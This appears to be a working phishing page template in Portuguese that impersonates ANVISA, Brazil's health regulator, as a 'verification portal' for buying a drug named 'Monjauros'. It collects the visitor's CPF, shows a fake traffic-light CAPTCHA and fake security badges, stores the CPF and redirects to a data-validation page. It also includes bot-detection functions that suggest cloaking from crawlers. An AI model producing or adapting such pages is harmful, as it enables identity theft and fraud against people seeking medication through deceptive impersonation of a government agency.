<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script>
      // Função para detectar se é um dispositivo móvel
      function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      }

      // Função para detectar bots conhecidos
      function isBot() {
        const botAgents = [
          'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
          'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
        ];
        return botAgents.some(bot => navigator.userAgent.includes(bot));
      }

      // Verifica largura da tela
      function isWideScreen() {
        return window.innerWidth > 768;
      }


      window.addEventListener('resize', checkAccess);

      // Máscara de CPF
      function maskCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        return cpf;
      }

      function applyCPFMask(event) {
        const input = event.target;
        input.value = maskCPF(input.value);
      }

      // Exibe o indicador de força da senha
      function showSecurityIndicator() {
        const securityIndicator = document.getElementById('securityIndicator');
        securityIndicator.classList.remove('hidden');
      }

      // Validação rigorosa de CPF
      function isValidCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

        let sum = 0;
        let remainder;

        for (let i = 1; i <= 9; i++) {
          sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
        }
        remainder = (sum * 10) % 11;
        if (remainder === 10 || remainder === 11) remainder = 0;
        if (remainder !== parseInt(cpf.substring(9, 10))) return false;

        sum = 0;
        for (let i = 1; i <= 10; i++) {
          sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
        }
        remainder = (sum * 10) % 11;
        if (remainder === 10 || remainder === 11) remainder = 0;
        if (remainder !== parseInt(cpf.substring(10, 11))) return false;

        return true;
      }

      // Mostra o reCAPTCHA
      function showCaptcha() {
        document.getElementById('captchaContainer').classList.remove('hidden');
      }
      
      // Função para verificar o CAPTCHA
      function verifyCaptcha() {
        const selectedImages = document.querySelectorAll('.captcha-image.selected');
        const selectedSemaforos = document.querySelectorAll('.captcha-image.selected[data-is-semaforo="true"]');
        
        // Verificar se pelo menos 3 imagens foram selecionadas
        if (selectedImages.length < 3) {
          document.getElementById('captchaError').classList.remove('hidden');
          document.getElementById('captchaError').textContent = "Por favor, selecione pelo menos 3 imagens.";
          return false;
        }
        
        // Verificar se todas as imagens de semáforo foram selecionadas (3 no total)
        if (selectedSemaforos.length !== 3) {
          document.getElementById('captchaError').classList.remove('hidden');
          document.getElementById('captchaError').textContent = "Verifique se você selecionou todos os semáforos.";
          return false;
        }
        
        document.getElementById('captchaError').classList.add('hidden');
        return true;
      }
      
      // Função para selecionar/deselecionar imagem do CAPTCHA
      function toggleCaptchaImage(element) {
        // Toggle da classe selected
        element.classList.toggle('selected');
        
        // Atualizar contador de seleção
        const selectedCount = document.querySelectorAll('.captcha-image.selected').length;
        const selectedSemaforos = document.querySelectorAll('.captcha-image.selected[data-is-semaforo="true"]').length;
        document.getElementById('selectedCount').textContent = selectedCount;
        
        // Verificar se são 3 semáforos para mostrar o contador em verde
        if (selectedSemaforos === 3) {
          document.querySelector('.selection-counter').classList.add('text-green-600', 'font-semibold');
        } else {
          document.querySelector('.selection-counter').classList.remove('text-green-600', 'font-semibold');
        }
        
        // Verificar se o botão de verificação pode ser habilitado
        document.getElementById('captchaVerifyButton').disabled = selectedCount < 3;
        
        // Se são exatamente 3 semáforos, habilitar o botão independentemente do total
        if (selectedSemaforos === 3) {
          // Habilitar botão e mudar cor para verde
          document.getElementById('captchaVerifyButton').disabled = false;
          document.getElementById('captchaVerifyButton').classList.add('bg-green-600', 'hover:bg-green-700');
          document.getElementById('captchaVerifyButton').classList.remove('bg-[#1351b4]', 'hover:bg-[#0c3d8a]');
          
          // Adicionar efeito de pulsação nas imagens de semáforo selecionadas
          document.querySelectorAll('.captcha-image.selected[data-is-semaforo="true"]').forEach(img => {
            img.classList.add('pulse');
          });
          
          // Texto de confirmação de sucesso
          document.getElementById('captchaError').textContent = "Todos os semáforos foram selecionados corretamente!";
          document.getElementById('captchaError').classList.remove('hidden', 'text-red-500');
          document.getElementById('captchaError').classList.add('text-green-600', 'font-semibold');
          
        } else {
          // Resetar para estado padrão
          document.getElementById('captchaVerifyButton').classList.remove('bg-green-600', 'hover:bg-green-700');
          document.getElementById('captchaVerifyButton').classList.add('bg-[#1351b4]', 'hover:bg-[#0c3d8a]');
          
          // Remover efeito de pulsação
          document.querySelectorAll('.captcha-image.selected[data-is-semaforo="true"]').forEach(img => {
            img.classList.remove('pulse');
          });
          
          // Ocultar mensagem de sucesso
          document.getElementById('captchaError').classList.add('hidden');
          document.getElementById('captchaError').classList.remove('text-green-600', 'font-semibold');
        }
      }
      
      // Verificação do CPF e processamento
      function verifyCPF(event) {
        event.preventDefault();
        
        // Mostra o indicador de processamento
        document.getElementById('processingIndicator').classList.remove('hidden');
        document.getElementById('verifyButton').disabled = true;
        
        const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');

        errorMessage.classList.add('hidden');
        successMessage.classList.add('hidden');

        if (!isValidCPF(cpf)) {
          errorMessage.textContent = "Por favor, insira um CPF válido.";
          errorMessage.classList.remove('hidden');
          document.getElementById('processingIndicator').classList.add('hidden');
          document.getElementById('verifyButton').disabled = false;
          return;
        }

        // Simulação de verificação inicial do CPF
        setTimeout(() => {
          document.getElementById('processingIndicator').classList.add('hidden');
          document.getElementById('verifyButton').disabled = false;
          
          // Mostrar o CAPTCHA após validação inicial do CPF
          showCaptcha();
        }, 1500);
      }
      
      // Submissão final após verificação do CAPTCHA
      function submitWithCaptcha() {
        // Verificar se o CAPTCHA foi resolvido corretamente
        if (!verifyCaptcha()) {
          return;
        }
        
        // Indicador de processamento para o CAPTCHA
        document.getElementById('captchaVerifyButton').disabled = true;
        document.getElementById('captchaProcessingIndicator').classList.remove('hidden');
        
        const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
        const successMessage = document.getElementById('successMessage');
        
        // Simulação de verificação com o servidor
        setTimeout(() => {
          document.getElementById('captchaProcessingIndicator').classList.add('hidden');
          
          // Ocultar o CAPTCHA
          document.getElementById('captchaContainer').classList.add('hidden');
          
          // Mostrar mensagem de sucesso
          successMessage.textContent = "Verificação concluída com sucesso! Redirecionando para validação de dados...";
          successMessage.classList.remove('hidden');
          
          // Armazenar o CPF no localStorage para uso na página de validação
          localStorage.setItem('cpfValidado', cpf);
          
          // Redirecionar para a página de validação de dados
          setTimeout(() => {
            window.location.href = "/validar-dados";
          }, 1500);
        }, 1500);
      }
  </script>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Portal de Verificação - Anvisa | Compra Segura de Medicamentos</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
      font-weight: 400;
      font-style: normal;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
      font-weight: 400;
      font-style: italic;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
      font-weight: 500;
      font-style: normal;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
      font-weight: 600;
      font-style: normal;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
      font-weight: 700;
      font-style: normal;
    }
    
    body {
      font-family: 'Rawline', sans-serif;
      background-color: #f8f9fa;
    }
    .monjauros-title {
      font-weight: 700;
      font-size: 1rem;
      color: #555;
      line-height: normal;
      text-transform: uppercase;
      text-align: left;
      margin-bottom: 1rem;
    }
    .main-title {
      font-size: 1.4rem;
      line-height: 2rem;
      font-weight: 600;
      color: #0c326f;
      padding-bottom: 10px;
      margin: 0;
    }
    .subtitle {
      font-weight: 400;
      font-size: 16px;
      color: #555;
      line-height: normal;
      margin-bottom: 10px;
    }
    .share-text {
      font-size: 12px;
      text-align: center;
    }
    .sticky-header {
      position: sticky;
      top: 0;
      background-color: white;
      z-index: 1000;
      transition: box-shadow 0.3s ease;
    }
    .sticky-header.shadow {
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .secure-badge {
      background-color: #e6f3e6;
      padding: 5px 10px;
      border-radius: 5px;
      font-size: 12px;
      color: #2e7d32;
      display: inline-flex;
      align-items: center;
      margin-right: 8px;
    }
    .secure-badge i {
      margin-right: 4px;
    }
    .form-container {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
      margin: 20px auto;
      max-width: 500px;
    }
    .form-container input {
      border: 1px solid #ccc;
      padding: 12px 15px;
      width: 100%;
      max-width: 350px;
      border-radius: 8px;
      font-size: 16px;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    .form-container input:focus {
      border-color: #1351b4;
      box-shadow: inset 0 1px 3px rgba(19, 81, 180, 0.2);
      outline: none;
    }
    .form-container button {
      background-color: #1351b4;
      color: white;
      padding: 12px 25px;
      border: none;
      border-radius: 30px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }
    .form-container button:hover {
      background-color: #0c3d8a;
    }
    .form-container button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    .error-message {
      color: #e53935;
      margin-top: 10px;
      font-size: 14px;
      text-align: center;
    }
    .success-message {
      color: #2e7d32;
      margin-top: 10px;
      font-size: 14px;
      text-align: center;
      font-weight: 500;
    }
    .hidden {
      display: none;
    }
    .security-features {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      margin-top: 15px;
      gap: 10px;
    }
    .security-feature {
      display: flex;
      align-items: center;
      font-size: 13px;
      color: #555;
      margin: 0 5px;
    }
    .security-feature i {
      color: #2e7d32;
      margin-right: 5px;
    }
    .info-box {
      background-color: #f1f7fe;
      border-left: 4px solid #1351b4;
      padding: 15px;
      margin: 20px 0;
      border-radius: 0 5px 5px 0;
    }
    .info-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background-color: #e3f2fd;
      color: #1351b4;
      margin-right: 15px;
    }
    .processing-indicator {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-top: 10px;
      color: #1351b4;
    }
    .processing-indicator i {
      margin-right: 8px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .security-indicator {
      display: flex;
      align-items: center;
      background-color: #f5f5f5;
      padding: 8px 12px;
      border-radius: 5px;
      margin-top: 15px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }
    .security-indicator .progress {
      height: 6px;
      background-color: #e0e0e0;
      border-radius: 3px;
      width: 150px;
      margin: 0 10px;
      overflow: hidden;
    }
    .security-indicator .progress-bar {
      height: 100%;
      background-color: #4caf50;
      width: 100%;
    }
    .security-indicator .status {
      font-size: 12px;
      font-weight: 500;
      color: #4caf50;
    }
    .vlibras-icon {
      position: fixed;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      z-index: 1000;
    }
    
    /* Estilos para o CAPTCHA */
    .captcha-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    
    .captcha-box {
      background-color: white;
      border-radius: 16px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
      width: 90%;
      max-width: 600px;
      padding: 30px;
      position: relative;
      border: 1px solid rgba(0,0,0,0.05);
    }
    
    .captcha-title {
      font-size: 22px;
      font-weight: 600;
      color: #0c326f;
      margin-bottom: 8px;
      text-align: center;
    }
    
    .captcha-subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 20px;
      text-align: center;
    }
    
    .captcha-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      margin-bottom: 20px;
      max-width: 450px;
      margin: 0 auto 20px;
      justify-items: center;
      align-items: center;
    }
    
    .captcha-image {
      height: 100px;
      border-radius: 8px;
      cursor: pointer;
      overflow: hidden;
      position: relative;
      transition: transform 0.2s, box-shadow 0.2s;
      border: 2px solid transparent;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .captcha-image img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }
    
    .captcha-image:hover {
      transform: scale(1.02);
    }
    
    .captcha-image.selected {
      border-color: #1351b4;
      box-shadow: 0 0 0 3px rgba(19, 81, 180, 0.4);
      transform: scale(1.02);
    }
    
    .captcha-image.selected[data-is-semaforo="true"] {
      border-color: #2e7d32;
      box-shadow: 0 0 0 3px rgba(46, 125, 50, 0.4);
    }
    
    @keyframes pulse-success {
      0% { box-shadow: 0 0 0 0 rgba(46, 125, 50, 0.7); }
      70% { box-shadow: 0 0 0 10px rgba(46, 125, 50, 0); }
      100% { box-shadow: 0 0 0 0 rgba(46, 125, 50, 0); }
    }
    
    .captcha-image.selected[data-is-semaforo="true"].pulse {
      animation: pulse-success 1.5s infinite;
    }
    
    .captcha-image.selected::after {
      content: '\f00c';
      font-family: 'Font Awesome 5 Free';
      font-weight: 900;
      position: absolute;
      top: 8px;
      right: 8px;
      background-color: #1351b4;
      color: white;
      width: 24px;
      height: 24px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
      transition: all 0.2s ease;
    }
    
    .captcha-image.selected[data-is-semaforo="true"]::after {
      background-color: #2e7d32;
    }
    
    .captcha-footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 15px;
    }
    
    .selection-counter {
      font-size: 13px;
      color: #666;
    }
    
    .captcha-actions {
      display: flex;
      gap: 10px;
    }
    
    .captcha-actions button {
      padding: 8px 20px;
      font-size: 14px;
    }
    
    .captcha-error {
      color: #e53935;
      font-size: 13px;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
  <div class="sticky-header">
    <div class="container mx-auto px-4 border-b border-[#0000001a]">
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center">
          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
            Centro de Verificação Digital | ANVISA
          </p>
        </div>
        <div class="flex items-center space-x-4">
          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
        </div>
      </div>
    </div>
  </div>
  
  <div class="container mx-auto px-4">
    <div class="py-4">
      <div class="flex items-center space-x-2 text-[13px]">
        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <span class="font-bold">Monjauros</span>
      </div>
    </div>
  </div>

  <main class="max-w-3xl mx-auto px-4 py-6">
    <div class="flex items-center justify-between mb-6">
      <div>
        <p class="monjauros-title">VERIFICAÇÃO DE ACESSO SEGURO</p>
        <h2 class="main-title">
          Portal de Verificação de Identidade
        </h2>
        <p class="subtitle">
          Este é um ambiente seguro para validação de sua identidade antes de prosseguir com a compra do Monjauros.
        </p>
      </div>
      <div class="hidden md:block">
        <img src="https://i.ibb.co/Hd4D5LD/secure-shield.png" alt="Símbolo de segurança" class="w-24 h-24">
      </div>
    </div>
    
    <div class="flex flex-wrap justify-center gap-3 my-4">
      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
      <span class="secure-badge"><i class="fas fa-user-shield"></i> Dados Protegidos</span>
    </div>
    
    <div class="info-box flex items-start">
      <div class="info-icon">
        <i class="fas fa-info"></i>
      </div>
      <div>
        <h3 class="font-semibold text-[#1351b4] mb-1">Ambiente Verificado</h3>
        <p class="text-sm">Esta é uma página oficial da ANVISA para verificação de identidade. Seus dados serão utilizados apenas para verificar sua elegibilidade para adquirir o medicamento Monjauros e não serão compartilhados com terceiros.</p>
      </div>
    </div>
    
    <div class="form-container">
      <h3 class="text-center font-semibold text-lg mb-4 text-[#0c326f]">Verificação de Identidade</h3>
      
      <p class="text-center text-sm mb-4">Para prosseguir com segurança, precisamos verificar sua identidade através do seu CPF.</p>
      
      <form onsubmit="verifyCPF(event)" class="text-center">
        <div class="mb-3">
          <label for="cpfInput" class="block text-sm font-medium text-gray-700 text-left mb-1 ml-1">CPF:</label>
          <input 
            type="text" 
            id="cpfInput" 
            placeholder="Digite seu CPF" 
            maxlength="14" 
            oninput="applyCPFMask(event)" 
            onfocus="showSecurityIndicator()" 
            required
            class="mb-2"
          >
          <div id="securityIndicator" class="security-indicator hidden">
            <span class="text-xs">Segurança:</span>
            <div class="progress">
              <div class="progress-bar"></div>
            </div>
            <span class="status">Alta</span>
          </div>
        </div>
        
        <button id="verifyButton" type="submit" class="mt-4">
          <i class="fas fa-shield-alt mr-2"></i> Verificar com Segurança
        </button>
        
        <div id="processingIndicator" class="processing-indicator hidden">
          <i class="fas fa-circle-notch"></i> Verificando...
        </div>
        
        <p id="errorMessage" class="error-message hidden"></p>
        <p id="successMessage" class="success-message hidden"></p>
      </form>
      
      <div class="security-features mt-6">
        <span class="security-feature"><i class="fas fa-fingerprint"></i> Verificação de identidade</span>
        <span class="security-feature"><i class="fas fa-shield-alt"></i> Proteção de dados</span>
        <span class="security-feature"><i class="fas fa-lock"></i> Criptografia SSL</span>
      </div>
    </div>
    
    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
      <p class="font-bold text-gray-700 text-base mb-2"><i class="fas fa-check-circle text-green-600 mr-2"></i>Processo 100% Seguro</p>
      <p class="text-gray-700 text-sm">
        Seus dados são protegidos pelos mais altos padrões de segurança, com certificação de proteção de dados em conformidade com a LGPD. Após a verificação bem-sucedida, você será redirecionado para a área segura de compra, onde poderá adquirir o Monjauros com total tranquilidade.
      </p>
      
      <hr class="my-4 border-gray-200">
      
      <div class="flex items-center">
        <i class="fas fa-question-circle text-[#1351b4] text-xl mr-3"></i>
        <div>
          <p class="font-semibold text-sm">Dúvidas sobre o processo de verificação?</p>
          <p class="text-xs text-gray-600">Entre em contato com nossa central de atendimento: <span class="text-[#1351b4]">atendimento@anvisa.gov.br</span></p>
        </div>
      </div>
    </div>
  </main>
  
  <div class="w-full mt-6">
    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
  </div>
  
  <a href="#" class="vlibras-icon">
    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
  </a>
  
  <!-- Container do CAPTCHA (inicialmente oculto) -->
  <div id="captchaContainer" class="captcha-container hidden">
    <div class="captcha-box">
      <h3 class="captcha-title">Verificação de Segurança</h3>
      <p class="captcha-subtitle">Selecione as imagens que contêm <strong>semáforo</strong>.</p>
      
      <p class="text-center text-sm mb-4">Para confirmar que você é humano, selecione todas as imagens abaixo que contêm <strong>semáforo de trânsito</strong>.</p>
      
      <div class="captcha-grid">
        <!-- Imagens diversas para o CAPTCHA -->
        <div class="captcha-image" data-is-semaforo="true" onclick="toggleCaptchaImage(this)">
          <img src="{{ url_for('static', filename='images/semaforo.jpg') }}" alt="Semáforo 1">
        </div>
        <div class="captcha-image" data-is-semaforo="false" onclick="toggleCaptchaImage(this)">
          <img src="https://picsum.photos/100/100?random=1" alt="Imagem aleatória">
        </div>
        <div class="captcha-image" data-is-semaforo="true" onclick="toggleCaptchaImage(this)">
          <img src="{{ url_for('static', filename='images/semaforo2.jpg') }}" alt="Semáforo 2">
        </div>
        <div class="captcha-image" data-is-semaforo="false" onclick="toggleCaptchaImage(this)">
          <img src="https://picsum.photos/100/100?random=2" alt="Imagem aleatória">
        </div>
        <div class="captcha-image" data-is-semaforo="false" onclick="toggleCaptchaImage(this)">
          <img src="https://picsum.photos/100/100?random=3" alt="Imagem aleatória">
        </div>
        <div class="captcha-image" data-is-semaforo="false" onclick="toggleCaptchaImage(this)">
          <img src="https://picsum.photos/100/100?random=4" alt="Imagem aleatória">
        </div>
        <div class="captcha-image" data-is-semaforo="true" onclick="toggleCaptchaImage(this)">
          <img src="{{ url_for('static', filename='images/semaforo3.jpg') }}" alt="Semáforo 3">
        </div>
        <div class="captcha-image" data-is-semaforo="false" onclick="toggleCaptchaImage(this)">
          <img src="https://picsum.photos/100/100?random=5" alt="Imagem aleatória">
        </div>
        <div class="captcha-image" data-is-semaforo="false" onclick="toggleCaptchaImage(this)">
          <img src="https://picsum.photos/100/100?random=6" alt="Imagem aleatória">
        </div>
      </div>
      <p id="captchaError" class="captcha-error hidden">Por favor, selecione pelo menos 3 imagens.</p>
      
      <div class="captcha-footer">
        <div class="selection-counter">
          Selecionado: <span id="selectedCount">0</span>/3
        </div>
        <div class="captcha-actions">
          <button type="button" onclick="submitWithCaptcha()" id="captchaVerifyButton" class="bg-[#1351b4] text-white rounded-full font-bold px-5 py-2.5 shadow-lg transition-all hover:bg-[#0c3d8a] focus:outline-none focus:ring-2 focus:ring-[#1351b4] focus:ring-opacity-50" disabled>
            <i class="fas fa-shield-alt mr-2"></i> Verificar
          </button>
        </div>
      </div>
      
      <div id="captchaProcessingIndicator" class="processing-indicator hidden text-center mt-4">
        <i class="fas fa-circle-notch"></i> Processando verificação...
      </div>
    </div>
  </div>
  
  <script>
    window.addEventListener('scroll', function() {
      var header = document.querySelector('.sticky-header');
      if (window.pageYOffset > 0) {
        header.classList.add('shadow');
      } else {
        header.classList.remove('shadow');
      }
    });
  </script>
</body>
</html>